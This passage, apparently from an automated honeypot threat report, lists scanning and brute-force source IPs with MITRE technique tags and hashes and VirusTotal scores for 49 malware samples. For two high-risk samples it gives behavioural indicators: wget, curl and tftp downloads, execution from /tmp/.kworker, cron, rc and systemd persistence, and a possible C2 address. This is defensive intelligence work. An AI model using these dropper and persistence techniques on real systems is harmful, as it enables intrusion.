| `195.178.110[.]78` | **3** | 2026-11-22 13:16 | 2026-11-22 16:07 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-11-22 15:34 | 2026-11-22 16:12 | 1m | 0 | `T1592` | 🟢 LOW |
| `211.230.3[.]71` | **2** | 2026-11-22 07:31 | 2026-11-22 08:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | **2** | 2026-11-22 07:08 | 2026-11-22 08:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-22 13:06 | 2026-11-22 14:31 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-11-22 09:55 | 2026-11-22 10:01 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.156.230[.]132` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]116` | 1 | 2026-11-22 03:17 | 2026-11-22 03:17 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.119.242[.]61` | 1 | 2026-11-22 05:03 | 2026-11-22 05:04 | 27s | 0 | `T1592` | 🟢 LOW |
| `120.26.218[.]184` | 1 | 2026-11-22 11:19 | 2026-11-22 11:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.146.233[.]245` | 1 | 2026-11-22 07:07 | 2026-11-22 07:07 | 24s | 0 | `T1592` | 🟢 LOW |
| `136.244.116[.]222` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.194[.]235` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `138.219.19[.]134` | 1 | 2026-11-22 08:58 | 2026-11-22 08:58 | 14s | 0 | `T1592` | 🟢 LOW |
| `138.68.183[.]183` | 1 | 2026-11-22 11:36 | 2026-11-22 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.84.162[.]21` | 1 | 2026-11-22 11:38 | 2026-11-22 11:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.84.216[.]190` | 1 | 2026-11-22 10:58 | 2026-11-22 10:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.84.247[.]204` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `144.202.93[.]178` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `149.28.144[.]255` | 1 | 2026-11-22 11:39 | 2026-11-22 11:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `149.28.82[.]67` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.40.127[.]148` | 1 | 2026-11-22 05:16 | 2026-11-22 05:16 | 0s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `155.138.155[.]23` | 1 | 2026-11-22 11:44 | 2026-11-22 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `157.245.144[.]21` | 1 | 2026-11-22 06:02 | 2026-11-22 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.203.35[.]156` | 1 | 2026-11-22 07:44 | 2026-11-22 07:44 | 8s | 0 | `T1592` | 🟢 LOW |
| `167.179.101[.]74` | 1 | 2026-11-22 11:37 | 2026-11-22 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.128.70[.]53` | 1 | 2026-11-22 03:40 | 2026-11-22 03:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.233.71[.]232` | 1 | 2026-11-22 04:19 | 2026-11-22 04:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.64.190[.]199` | 1 | 2026-11-22 11:40 | 2026-11-22 11:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.196.131[.]202` | 1 | 2026-11-22 14:01 | 2026-11-22 14:02 | 27s | 0 | `T1592` | 🟢 LOW |
| `175.6.54[.]250` | 1 | 2026-11-22 04:08 | 2026-11-22 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-22 04:36 | 2026-11-22 04:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-22 06:44 | 2026-11-22 06:44 | 9s | 0 | `T1592` | 🟢 LOW |
| `181.215.115[.]186` | 1 | 2026-11-22 13:25 | 2026-11-22 13:25 | 0s | 1 | `T1110.001` | 🟢 LOW |
| `185.76.69[.]154` | 1 | 2026-11-22 11:38 | 2026-11-22 11:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `187.142.113[.]192` | 1 | 2026-11-22 15:48 | 2026-11-22 15:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]118` | 1 | 2026-11-22 10:49 | 2026-11-22 10:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.164.88[.]122` | 1 | 2026-11-22 16:51 | 2026-11-22 16:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-11-22 14:28 | 2026-11-22 14:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-22 03:44 | 2026-11-22 03:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-22 07:41 | 2026-11-22 07:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-22 12:41 | 2026-11-22 12:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.213.16[.]21` | 1 | 2026-11-22 10:33 | 2026-11-22 10:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.170.195[.]202` | 1 | 2026-11-22 06:40 | 2026-11-22 06:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-11-22 02:56 | 2026-11-22 02:57 | 10s | 0 | `T1592` | 🟢 LOW |
| `195.60.70[.]221` | 1 | 2026-11-22 15:38 | 2026-11-22 15:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `198.163.193[.]182` | 1 | 2026-11-22 08:50 | 2026-11-22 08:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]33` | 1 | 2026-11-22 12:10 | 2026-11-22 12:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.202[.]138` | 1 | 2026-11-22 09:59 | 2026-11-22 09:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `201.79.23[.]140` | 1 | 2026-11-22 11:33 | 2026-11-22 11:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.79.36[.]16` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.189.211[.]148` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.189.40[.]120` | 1 | 2026-11-22 13:44 | 2026-11-22 13:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `208.72.153[.]219` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `208.85.17[.]91` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.110.153[.]56` | 1 | 2026-11-22 10:02 | 2026-11-22 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.128.141[.]216` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.128.157[.]57` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.238.81[.]40` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.131.139[.]70` | 1 | 2026-11-22 07:32 | 2026-11-22 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.152.136[.]35` | 1 | 2026-11-22 10:53 | 2026-11-22 10:53 | 21s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-22 08:48 | 2026-11-22 08:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.79.0[.]195` | 1 | 2026-11-22 11:01 | 2026-11-22 11:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-22 04:45 | 2026-11-22 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.202.173[.]165` | 1 | 2026-11-22 15:02 | 2026-11-22 15:02 | 14s | 0 | `T1592` | 🟢 LOW |
| `35.206.141[.]203` | 1 | 2026-11-22 03:19 | 2026-11-22 03:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.174[.]128` | 1 | 2026-11-22 06:00 | 2026-11-22 06:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.184[.]237` | 1 | 2026-11-22 06:01 | 2026-11-22 06:01 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.22[.]77` | 1 | 2026-11-22 05:49 | 2026-11-22 05:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.254[.]127` | 1 | 2026-11-22 06:01 | 2026-11-22 06:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.54[.]245` | 1 | 2026-11-22 03:08 | 2026-11-22 03:08 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.98[.]104` | 1 | 2026-11-22 06:24 | 2026-11-22 06:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.52.141[.]224` | 1 | 2026-11-22 13:37 | 2026-11-22 13:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `38.248.168[.]13` | 1 | 2026-11-22 11:12 | 2026-11-22 11:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-11-22 03:32 | 2026-11-22 03:32 | 8s | 0 | `T1592` | 🟢 LOW |
| `44.220.188[.]117` | 1 | 2026-11-22 12:04 | 2026-11-22 12:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-22 05:15 | 2026-11-22 05:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-22 11:20 | 2026-11-22 11:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-22 14:05 | 2026-11-22 14:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.32.172[.]141` | 1 | 2026-11-22 11:33 | 2026-11-22 11:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-11-22 09:59 | 2026-11-22 09:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.76.88[.]127` | 1 | 2026-11-22 11:36 | 2026-11-22 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-22 08:43 | 2026-11-22 08:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.178[.]14` | 1 | 2026-11-22 03:46 | 2026-11-22 03:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.102.100[.]45` | 1 | 2026-11-22 13:03 | 2026-11-22 13:03 | 12s | 0 | `T1592` | 🟢 LOW |
| `49.144.46[.]214` | 1 | 2026-11-22 15:32 | 2026-11-22 15:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-22 10:05 | 2026-11-22 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-22 13:17 | 2026-11-22 13:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]148` | 1 | 2026-11-22 07:11 | 2026-11-22 07:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-22 10:19 | 2026-11-22 10:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-22 16:12 | 2026-11-22 16:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.176.191[.]68` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.176.234[.]239` | 1 | 2026-11-22 11:39 | 2026-11-22 11:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.176.28[.]21` | 1 | 2026-11-22 11:37 | 2026-11-22 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.176.61[.]187` | 1 | 2026-11-22 11:44 | 2026-11-22 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.177.53[.]125` | 1 | 2026-11-22 11:37 | 2026-11-22 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.177.64[.]230` | 1 | 2026-11-22 11:38 | 2026-11-22 11:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]48` | 1 | 2026-11-22 05:38 | 2026-11-22 05:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]115` | 1 | 2026-11-22 06:53 | 2026-11-22 06:53 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]212` | 1 | 2026-11-22 04:34 | 2026-11-22 04:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.20.86[.]125` | 1 | 2026-11-22 11:37 | 2026-11-22 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]99` | 1 | 2026-11-22 08:32 | 2026-11-22 08:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]108` | 1 | 2026-11-22 08:33 | 2026-11-22 08:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]247` | 1 | 2026-11-22 12:31 | 2026-11-22 12:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]63` | 1 | 2026-11-22 08:31 | 2026-11-22 08:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]97` | 1 | 2026-11-22 13:31 | 2026-11-22 13:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-22 09:37 | 2026-11-22 09:37 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.245.204[.]22` | 1 | 2026-11-22 11:34 | 2026-11-22 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `67.219.108[.]209` | 1 | 2026-11-22 11:36 | 2026-11-22 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.174.30[.]78` | 1 | 2026-11-22 14:33 | 2026-11-22 14:34 | 14s | 0 | `T1592` | 🟢 LOW |
| `70.27.245[.]234` | 1 | 2026-11-22 04:22 | 2026-11-22 04:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `70.34.201[.]45` | 1 | 2026-11-22 11:52 | 2026-11-22 11:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.34.255[.]103` | 1 | 2026-11-22 11:35 | 2026-11-22 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.44.141[.]43` | 1 | 2026-11-22 07:00 | 2026-11-22 07:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `75.91.204[.]227` | 1 | 2026-11-22 11:43 | 2026-11-22 11:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.181.53[.]12` | 1 | 2026-11-22 08:33 | 2026-11-22 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-22 04:55 | 2026-11-22 04:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-22 15:53 | 2026-11-22 15:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | 1 | 2026-11-22 05:08 | 2026-11-22 05:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | 1 | 2026-11-22 10:31 | 2026-11-22 10:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | 1 | 2026-11-22 13:22 | 2026-11-22 13:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | 1 | 2026-11-22 16:51 | 2026-11-22 16:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]161` | 1 | 2026-11-22 11:21 | 2026-11-22 11:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]252` | 1 | 2026-11-22 16:36 | 2026-11-22 16:36 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `77.67.26[.]93` | 1 | 2026-11-22 05:51 | 2026-11-22 05:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-22 07:22 | 2026-11-22 07:22 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-22 11:50 | 2026-11-22 11:50 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-22 16:14 | 2026-11-22 16:14 | 6s | 0 | `T1592` | 🟢 LOW |
| `79.101.149[.]63` | 1 | 2026-11-22 08:57 | 2026-11-22 08:57 | 12s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-22 05:16 | 2026-11-22 05:16 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-22 13:11 | 2026-11-22 13:11 | 9s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-11-22 07:52 | 2026-11-22 07:53 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.10.252[.]80` | 1 | 2026-11-22 10:09 | 2026-11-22 10:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `82.147.85[.]98` | 1 | 2026-11-22 04:05 | 2026-11-22 04:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]78` | 1 | 2026-11-22 05:40 | 2026-11-22 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.193.172[.]91` | 1 | 2026-11-22 05:06 | 2026-11-22 05:06 | 14s | 0 | `T1592` | 🟢 LOW |
| `92.52.157[.]137` | 1 | 2026-11-22 08:29 | 2026-11-22 08:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.179.131[.]132` | 1 | 2026-11-22 10:51 | 2026-11-22 10:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `99.70.29[.]51` | 1 | 2026-11-22 14:03 | 2026-11-22 14:03 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

